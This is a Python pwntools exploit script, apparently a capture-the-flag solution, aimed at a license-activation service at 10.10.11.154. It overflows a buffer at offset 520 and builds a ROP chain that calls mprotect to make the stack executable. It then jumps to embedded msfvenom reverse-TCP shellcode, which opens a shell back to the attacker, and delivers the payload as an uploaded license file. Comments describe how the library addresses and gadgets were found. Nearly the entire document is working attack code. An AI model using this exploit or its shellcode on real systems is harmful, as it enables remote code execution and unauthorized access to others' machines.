from pwn import *
import struct, socket, re, requests

context.clear(arch='amd64')
# search PID of activate_license in /proc/sched_debug
# search addresses in /proc/<PID>/maps
## 7ffff7cbb000-7ffff7ce0000 r--p 00000000 fe:01 261658                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
libc_base = int('7ffff7cbb000', 16)
libc_path = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"

## 7ffff7e80000-7ffff7e90000 r--p 00000000 fe:01 268827                    /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
libsqlite_base = int('7ffff7e80000', 16)
libsqlite_path = "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6"

## 7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]                                     
stack_base = int('7ffffffde000', 16)
stack_end  = int('7ffffffff000', 16)

# calc sizeof(stack) for mprotect
stack_size = stack_end - stack_base

log.info(f"libc_base        -> {hex(libc_base)}")
log.info(f"libsqlite_base  -> {hex(libsqlite_base)}")
log.info(f"stack_base      -> {hex(stack_base)}")
log.info(f"stack_end        -> {hex(stack_end)}")
log.info(f"stack_size      -> {hex(stack_size)}")

#msfvenom -p linux/x64/shell_reverse_tcp LHOST=<<ip address>> LPORT=<<Port>> -f py
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
shellcode += b"\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x10\x02\x51\x48"
shellcode += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
shellcode += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
shellcode += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
shellcode += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# download files from remote server and save them on local machine
# /usr/lib/x86_64-linux-gnu/libc-2.31.so
# /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
libc          = ELF("/tmp/libc-2.31.so",checksec=False)
libc.address  = libc_base
libsql        = ELF("/tmp/libsqlite3.so.0.8.6",checksec=False)
libsql.address = libsqlite_base
rop            = ROP([libc, libsql])

# search ROP Gadgets
mprotect = libc.symbols['mprotect']      # readelf -s libc.so.6 | grep mprotect
pop_rdi  = rop.rdi[0]                    # ropper -f libc.so.6 --search "pop rdi"
pop_rsi  = rop.rsi[0]                    # ropper -f libc.so.6 --search "pop rsi"
pop_rdx  = rop.rdx[0]                    # ropper -f libc.so.6 --search "pop rdx"
jmp_rsp  = rop.jmp_rsp[0]                # ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"

# find offset unsing gdb
#└─$ gdb --args ./activate_license 1337
# gdb-peda$ pattern_create 800 pattern.txt
# gdb-peda$ run                        >>  then use socket, request python, curl to send that pattern was created.
# gdb-peda$ x/wx $rsp                  >> result: 0x7fffffffdfa8: 0x416a7341
# gdb-peda$ pattern_offset 0x416a7341  >> result: 1097495361 found at offset: 520
offset  = 520
payload = b'A' * offset

#int mprotect(void *addr, size_t len, int prot);
payload += p64(pop_rdi) + p64(stack_base)      # addr = Begin of Stack
payload += p64(pop_rsi) + p64(stack_size)      # len  = size of Stack
payload += p64(pop_rdx) + p64(7)                # prot = Permission 7 -> rwx
payload += p64(mprotect)                        # call mprotect

payload += p64(jmp_rsp)                        # jmp rsp
payload += shellcode                            # add shellcode

datafile  = {'licensefile': ("key.txt", payload, 'application/octet-stream')}
headers = {
      "Accept": "application/octet-stream",
      "Accept-Encoding": "gzip, deflate",
      "Connection": "close",
      "Upgrade-Insecure-Requests": "1"
    }
requests.post('http://10.10.11.154/activate_license.php', files=datafile, headers=headers)
